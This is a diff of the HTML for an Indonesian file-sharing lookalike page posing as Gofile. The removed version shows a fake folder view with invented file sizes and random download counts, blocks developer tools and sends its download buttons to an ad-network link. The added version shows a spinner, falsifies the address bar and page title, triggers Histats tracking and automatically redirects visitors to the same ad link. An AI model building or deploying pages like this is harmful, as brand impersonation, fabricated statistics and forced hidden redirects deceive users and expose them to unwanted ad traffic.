@@ -1,335 +1,169 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="referrer" content="no-referrer">
-    <meta http-equiv="X-Frame-Options" content="DENY">
-    <title>Gofile - Folder View</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <style>
-        /* PROTEKSI UI: Mencegah pengguna memblok/menyorot teks atau gambar di dalam web */
-        body {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-        }
-    </style>
-</head>
-<body class="bg-[#0b0f19] text-gray-200 min-h-screen flex flex-col items-center p-3 sm:p-6 pt-[115px]" oncontextmenu="return false;">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>gigafile</title>
+  <style>
+    * { box-sizing: border-box; }
 
-    <div class="fixed top-0 left-0 right-0 w-full flex justify-center bg-[#0b0f19]/90 py-1.5 border-b border-gray-800/40 z-50 shadow-xl min-h-[105px]">
-        <div id="wadah-iklan-native-sticky" class="w-[200px] h-[100px] text-center overflow-hidden flex items-center justify-center bg-transparent"></div>
-    </div>
-
-    <div class="max-w-3xl w-full bg-[#111827] rounded-xl p-4 sm:p-5 shadow-2xl border border-gray-800/80 mt-2 overflow-hidden">
-        
-        <div class="border-b border-gray-800 pb-4 mb-4">
-            <div class="flex items-start gap-3">
-                <span class="text-3xl text-yellow-500 mt-1"><i class="fa-solid fa-folder"></i></span>
-                <div class="min-w-0 flex-1">
-                    <h2 id="folder-title-display" class="text-base font-bold text-gray-100 tracking-wide truncate">Memuat info folder...</h2>
-                    <p id="folder-date" class="text-[11px] text-gray-500 mt-0.5">Menghubungkan...</p>
-                    <div class="flex gap-2 mt-2">
-                        <span class="text-[10px] bg-gray-800/80 text-emerald-400 px-2 py-0.5 rounded border border-gray-700/50 flex items-center gap-1">
-                            <i class="fa-solid fa-earth-asia text-[9px]"></i> public
-                        </span>
-                        <span id="file-count" class="text-[10px] bg-gray-800/80 text-gray-400 px-2 py-0.5 rounded border border-gray-700/50">
-                            0 items
-                        </span>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div id="files-feed-container" class="space-y-0 divide-y divide-gray-800/70">
-            <div class="text-center py-12 text-xs text-yellow-500 animate-pulse">
-                <i class="fa-solid fa-spinner fa-spin mr-1"></i> Memuat isi berkas Gofile...
-            </div>
-        </div>
-
-        <div class="mt-8 pt-4 border-t border-gray-800 text-center text-[10px] text-gray-600 tracking-wide">
-            Showing 1000 items per page • Total <span id="total-items-footer">0</span> items
-        </div>
-    </div>
-
-    <script>
-        const SUPABASE_URL = "https://ehhrvswzhirrnrqxmxae.supabase.co"; 
-        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVoaHJ2c3d6aGlycm5ycXhteGFlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAyMjg2NDcsImV4cCI6MjA5NTgwNDY0N30.75vZs3Rn6j7YSlInHpGDN39OGjhywcEBv8j-hawyOlY";
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-        const videoSlug = window.location.pathname.split('/').filter(Boolean).pop();
-
-        const folderTitleDisplay = document.getElementById('folder-title-display');
-        const folderDate = document.getElementById('folder-date');
-        const filesFeedContainer = document.getElementById('files-feed-container');
-        const fileCountSpan = document.getElementById('file-count');
-        const totalItemsFooter = document.getElementById('total-items-footer');
-
-        let videoUrlsCache = {};
-        const DOWNLOAD_REDIRECT_URL = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
-
-        // PROTEKSI KEYBOARD: Blokir F12, Ctrl+Shift+I/J/C, dan Ctrl+U
-        document.addEventListener('keydown', function(e) {
-            if (
-                e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
-                (e.ctrlKey && e.key === 'u')
-            ) {
-                e.preventDefault();
-                return false;
-            }
-        });
-
-        // SKRIP PEMUATAN IKLAN NATIVE STICKY SECARA OTOMATIS JAVASCRIPT
-        function pasangIklanNativeSticky() {
-            const kontainerIklan = document.getElementById('wadah-iklan-native-sticky');
-            if (!kontainerIklan) return;
-
-            // Buat elemen script Adsterra via JS secara asinkronus
-            const scriptAtas = document.createElement('script');
-            scriptAtas.type = "text/javascript";
-            scriptAtas.async = true;
-            scriptAtas.dataset.cfasync = "false";
-            scriptAtas.src = "https://braverybreezebinding.com/122b006ae61ef549a738f7e587027d5a/invoke.js";
-
-            // Buat div target internal penampung iklan
-            const divInternal = document.createElement('div');
-            divInternal.id = "container-122b006ae61ef549a738f7e587027d5a";
-            divInternal.className = "w-full h-full flex items-center justify-center";
-
-            // Suntikkan script dan kontainer ke dalam wadah sticky HTML
-            kontainerIklan.appendChild(scriptAtas);
-            kontainerIklan.appendChild(divInternal);
-        }
-
-        async function loadGofileFeed() {
-            if (!videoSlug || videoSlug === 'view.html') {
-                folderTitleDisplay.textContent = "Error: Link Tidak Valid";
-                filesFeedContainer.innerHTML = `<p class="text-red-400 text-xs text-center py-4">Parameter token slug hilang atau tidak valid.</p>`;
-                return;
-            }
-
-            try {
-                const { data: packageData, error: packageError } = await supabaseClient
-                    .from('video_packages')
-                    .select('*')
-                    .eq('slug', videoSlug)
-                    .single();
-
-                if (packageError || !packageData) {
-                    folderTitleDisplay.textContent = "Folder Not Found";
-                    filesFeedContainer.innerHTML = `<p class="text-red-400 text-xs text-center py-4">Sistem tidak menemukan folder tersebut.</p>`;
-                    return;
-                }
-
-                folderTitleDisplay.textContent = packageData.title;
-                if (packageData.created_at) {
-                    const tanggal = new Date(packageData.created_at);
-                    folderDate.textContent = `${tanggal.toLocaleDateString('id-ID')}, ${tanggal.toLocaleTimeString('id-ID', {hour: '2-digit', minute:'2-digit'})}`;
-                }
-
-                const { data: itemsData, error: itemsError } = await supabaseClient
-                    .from('video_items')
-                    .select('*')
-                    .eq('package_id', packageData.id);
-
-                if (itemsError || !itemsData || itemsData.length === 0) {
-                    filesFeedContainer.innerHTML = `<p class="text-gray-500 text-xs text-center py-8">Folder kosong (Belum ada file diunggah).</p>`;
-                    return;
-                }
-
-                const totalFiles = itemsData.length;
-                fileCountSpan.textContent = `Total ${totalFiles} items`;
-                totalItemsFooter.textContent = totalFiles;
-                filesFeedContainer.innerHTML = "";
-
-                itemsData.forEach((item, index) => {
-                    const fullUrl = item.video_url;
-                    videoUrlsCache[item.id] = fullUrl; 
-                    
-                    let baseCleanUrl = fullUrl.split('#')[0];
-                    let fileName = baseCleanUrl.split('/').pop().split('?')[0] || `Video_File_${index + 1}.mp4`;
-                    
-                    if (fullUrl.includes('youtube.com') || fullUrl.includes('youtu.be')) {
-                        fileName = `YouTube_Stream_Part_${index + 1}.mp4`;
-                    }
-
-                    const fakeSize = ((index + 2) * 21.4).toFixed(1) + " MB";
-                    const fakeDownloads = Math.floor(Math.random() * (50000 - 1000 + 1)) + 1000;
-
-                    let itemDateStr = folderDate.textContent;
-                    if (item.created_at) {
-                        const tglItem = new Date(item.created_at);
-                        itemDateStr = `${tglItem.getDate()}/${tglItem.getMonth()+1}/${tglItem.getFullYear()}, ${tglItem.getHours().toString().padStart(2, '0')}.${tglItem.getMinutes().toString().padStart(2, '0')}.${tglItem.getSeconds().toString().padStart(2, '0')}`;
-                    }
-
-                    const card = document.createElement('div');
-                    card.className = "py-4 flex flex-col w-full";
-
-                    card.innerHTML = `
-                        <div class="flex items-start justify-between w-full gap-3">
-                            
-                            <div class="flex items-center gap-2 flex-shrink-0 mt-1">
-                                <input type="checkbox" class="w-3.5 h-3.5 rounded bg-gray-900 border-gray-700 text-blue-600 focus:ring-0 cursor-pointer">
-                                <span class="text-blue-500 text-base"><i class="fa-solid fa-file-video"></i></span>
-                            </div>
-
-                            <div class="flex-1 min-w-0 flex flex-col">
-                                <div class="mb-3">
-                                    <h3 class="text-xs font-semibold text-gray-200 tracking-wide break-all line-clamp-1">${fileName}</h3>
-                                    <p class="text-[10px] text-gray-500 mt-0.5">${itemDateStr}</p>
-                                    <p class="text-[10px] text-gray-500">${fakeSize}</p>
-                                    <p class="text-[10px] text-gray-500">${fakeDownloads.toLocaleString('id-ID')} downloads</p>
-                                </div>
-
-                                <div id="mini-viewport-${item.id}" onclick="handleThumbnailClick(event, '${item.id}', '${fileName}')" class="w-full max-w-[160px] sm:max-w-[180px] rounded bg-black border border-gray-800/60 flex items-center justify-center relative overflow-hidden cursor-pointer hover:opacity-90 transition-all duration-150" style="display: block;">
-                                    ${renderThumbnailPlayer(fullUrl)}
-                                </div>
-                            </div>
-
-                            <div class="flex items-center gap-1.5 flex-shrink-0 mt-1">
-                                <button type="button" id="play-btn-${item.id}" data-status="paused" onclick="handleButtonClick(event, '${item.id}', '${fileName}')" class="w-8 h-8 rounded bg-gray-800 hover:bg-gray-700 text-gray-300 border border-gray-700/80 flex items-center justify-center text-xs" title="Play Video">
-                                    <i class="fa-solid fa-play"></i>
-                                </button>
-                                <a href="${DOWNLOAD_REDIRECT_URL}" target="_blank" class="w-8 h-8 rounded bg-gray-800 hover:bg-gray-700 text-gray-300 border border-gray-700/80 flex items-center justify-center text-xs" title="Download">
-                                    <i class="fa-solid fa-download"></i>
-                                </a>
-                                <button type="button" class="w-8 h-8 rounded bg-gray-800 hover:bg-gray-700 text-gray-400 border border-gray-700/80 flex items-center justify-center text-xs">
-                                    <i class="fa-solid fa-ellipsis-vertical"></i>
-                                </button>
-                            </div>
-
-                        </div>
-
-                        <div id="expanded-zone-${item.id}" class="w-auto hidden mt-3 bg-black -mx-4 sm:-mx-5 border-y border-gray-800 aspect-video shadow-2xl"></div>
-                    `;
-
-                    filesFeedContainer.appendChild(card);
-                });
-
-            } catch (err) {
-                console.error(err);
-                folderTitleDisplay.textContent = "Error Jaringan";
-            }
-        }
-
-        function renderThumbnailPlayer(url) {
-            if (url.match(/\.(mp4|webm|ogg)/i) || url.includes('supabase.co/storage')) {
-                const thumbnailUrl = url.includes('#t=') ? url : `${url}#t=5`;
-                return `<video preload="metadata" muted playsinline oncontextmenu="return false;" class="w-full h-auto max-h-[240px] aspect-auto object-contain pointer-events-none select-none"><source src="${thumbnailUrl}" type="video/mp4"></video>`;
-            } else if (url.includes('youtube.com') || url.includes('youtu.be')) {
-                let embedUrl = url;
-                if(embedUrl.includes('watch?v=')) embedUrl = embedUrl.replace('watch?v=', 'embed/');
-                if(embedUrl.includes('youtu.be/')) embedUrl = embedUrl.replace('youtu.be/', 'youtube.com/embed/');
-                return `<div class="w-full aspect-video"><iframe src="${embedUrl}" class="w-full h-full pointer-events-none opacity-50" frameborder="0"></iframe></div>`;
-            } else {
-                return `<div class="p-8"><i class="fa-solid fa-video text-gray-700 text-xl"></i></div>`;
-            }
-        }
-
-        function handleThumbnailClick(e, id, title) {
-            e.preventDefault();
-            e.stopPropagation();
-            const btn = document.getElementById('play-btn-' + id);
-            if (btn.getAttribute('data-status') !== 'playing') {
-                playVideo(id, title);
-            }
-        }
-
-        function handleButtonClick(e, id, title) {
-            e.preventDefault();
-            e.stopPropagation();
-            const btn = document.getElementById('play-btn-' + id);
-            const currentStatus = btn.getAttribute('data-status');
-            
-            if (currentStatus === 'playing') {
-                closeVideo(id);
-            } else {
-                playVideo(id, title);
-            }
-        }
-
-        function playVideo(id, title) {
-            const btn = document.getElementById('play-btn-' + id);
-            const miniBox = document.getElementById('mini-viewport-' + id);
-            const bigPlayerZone = document.getElementById('expanded-zone-' + id);
-            const fileUrl = videoUrlsCache[id];
-
-            btn.setAttribute('data-status', 'playing');
-            btn.innerHTML = `<i class="fa-solid fa-xmark text-sm"></i>`; 
-            btn.className = "w-8 h-8 rounded bg-red-600 hover:bg-red-700 text-white border border-red-500 flex items-center justify-center text-xs shadow-md";
-
-            miniBox.style.setProperty('display', 'none', 'important'); 
-            bigPlayerZone.classList.remove('hidden'); 
-
-            if (fileUrl.match(/\.(mp4|webm|ogg)/i) || fileUrl.includes('supabase.co/storage')) {
-                const playUrl = fileUrl.split('#')[0];
-                bigPlayerZone.innerHTML = `<video controls autoplay playsinline controlsList="nodownload" oncontextmenu="return false;" class="w-full h-full object-contain select-none"><source src="${playUrl}" type="video/mp4"></video>`;
-            } else if (fileUrl.includes('youtube.com') || fileUrl.includes('youtu.be')) {
-                let embed = fileUrl;
-                if(embed.includes('watch?v=')) embed = embed.replace('watch?v=', 'embed/');
-                if(embed.includes('youtu.be/')) embed = embed.replace('youtu.be/', 'youtube.com/embed/');
-                embed += embed.includes('?') ? "&autoplay=1" : "?autoplay=1";
-                bigPlayerZone.innerHTML = `<iframe src="${embed}" class="w-full h-full" frameborder="0" allow="autoplay" allowfullscreen></iframe>`;
-            } else {
-                bigPlayerZone.innerHTML = `
-                    <div class="w-full h-full flex flex-col items-center justify-center bg-gray-900 p-4">
-                        <p class="text-[11px] text-gray-400 mb-2">${title}</p>
-                        <a href="${fileUrl}" target="_blank" class="bg-blue-600 text-white text-[10px] py-1.5 px-3 rounded font-bold">Buka Sumber</a>
-                    </div>`;
-            }
-
-            setTimeout(() => {
-                bigPlayerZone.scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'center'
-                });
-            }, 150);
-        }
-
-        function closeVideo(id) {
-            const btn = document.getElementById('play-btn-' + id);
-            const miniBox = document.getElementById('mini-viewport-' + id);
-            const bigPlayerZone = document.getElementById('expanded-zone-' + id);
-
-            bigPlayerZone.innerHTML = ""; 
-            bigPlayerZone.classList.add('hidden'); 
-
-            btn.setAttribute('data-status', 'paused');
-            btn.innerHTML = `<i class="fa-solid fa-play"></i>`; 
-            btn.className = "w-8 h-8 rounded bg-gray-800 hover:bg-gray-700 text-gray-300 border border-gray-700/80 flex items-center justify-center text-xs";
-            
-            miniBox.style.setProperty('display', 'block', 'important'); 
-        }
-
-        // Eksekusi skrip pemanggilan iklan dan konten database
-        pasangIklanStickyActive = pasangIklanNativeSticky();
-        loadGofileFeed();
-    </script>
-    <script>
-    history.replaceState(null, "", "/");
-    document.title = "ws";
-
-    if (!sessionStorage.getItem("histats_hit")) {
-      sessionStorage.setItem("histats_hit", "1");
-
-      var _Hasync = _Hasync || [];
-      _Hasync.push(['Histats.start','1,4971849,4,0,0,0,00000000']);
-      _Hasync.push(['Histats.fasi','1']);
-      _Hasync.push(['Histats.track_hits','']);
-
-      (function() {
-        var hs = document.createElement('script');
-        hs.async = true;
-        hs.src = '//s10.histats.com/js15_as.js';
-        document.body.appendChild(hs);
-      })();
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #1f2a3a; /* dark blue ala gofile */
+      display: flex;
+      flex-direction: column;
+      color: #94a3b8;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
     }
-    </script> 
+
+    /* HEADER */
+    header {
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      background: #1b2533;
+    }
+
+    .menu-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 6px;
+      background: #2563eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .menu-btn span,
+    .menu-btn span::before,
+    .menu-btn span::after {
+      content: '';
+      display: block;
+      width: 16px;
+      height: 2px;
+      background: #fff;
+      position: relative;
+    }
+
+    .menu-btn span::before { top: -5px; position: absolute; }
+    .menu-btn span::after { top: 5px; position: absolute; }
+
+    /* MAIN */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* GOFILE-LIKE SPINNER */
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 5px solid transparent;
+      border-top-color: #3b82f6;
+      border-right-color: #3b82f6;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* FOOTER */
+    footer {
+      padding: 20px 0 30px;
+      text-align: center;
+      font-size: 14px;
+      background: #1b2533;
+    }
+
+    footer a {
+      display: block;
+      color: #94a3b8;
+      text-decoration: none;
+      margin: 6px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="menu-btn"><span></span></div>
+  </header>
+
+    <main id="content">
+    <div class="spinner" id="spinner"></div>
+  </main>
+
+  <footer>
+    <a href="#">Home</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Copyright</a>
+    <a href="#">Contact</a>
+    <a href="#">made with ❤️ by G0fil Team</a>
+  </footer>
+
+  <script>
+    // spinner tampil 2 detik lalu hilang
+    setTimeout(() => {
+      const spinner = document.getElementById('spinner');
+      spinner.style.opacity = '0';
+      spinner.style.transition = 'opacity 0.3s ease';
+    }, 2000);
+  </script>
+
+<!-- ===== HISTATS (PAKSA ROOT) ===== -->
+<script>
+/* paksa Histats selalu baca ROOT */
+history.replaceState(null, "", "/");
+document.title = "gofile.ws";
+
+/* cegah double hit */
+if (!sessionStorage.getItem("histats_hit")) {
+  sessionStorage.setItem("histats_hit", "1");
+
+  var _Hasync = _Hasync || [];
+  _Hasync.push(['Histats.start','1,4971849,4,0,0,0,00000000']);
+  _Hasync.push(['Histats.fasi','1']);
+  _Hasync.push(['Histats.track_hits','']);
+
+  (function() {
+    var hs = document.createElement('script');
+    hs.async = true;
+    hs.src = '//s10.histats.com/js15_as.js';
+    document.body.appendChild(hs);
+  })();
+}
+</script>
+<!-- ===== END HISTATS ===== -->
+
+<script>
+/* tampilkan slug random SETELAH Histats */
+setTimeout(() => {
+  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+  let slug = "";
+  for (let i = 0; i < 4; i++) {
+    slug += c[Math.floor(Math.random() * c.length)];
+  }
+  history.replaceState(null, "", "/" + slug);
+}, 200);
+
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+  }, 600);
+}, 800);
+</script>
+
+
+  
 </body>
 </html>
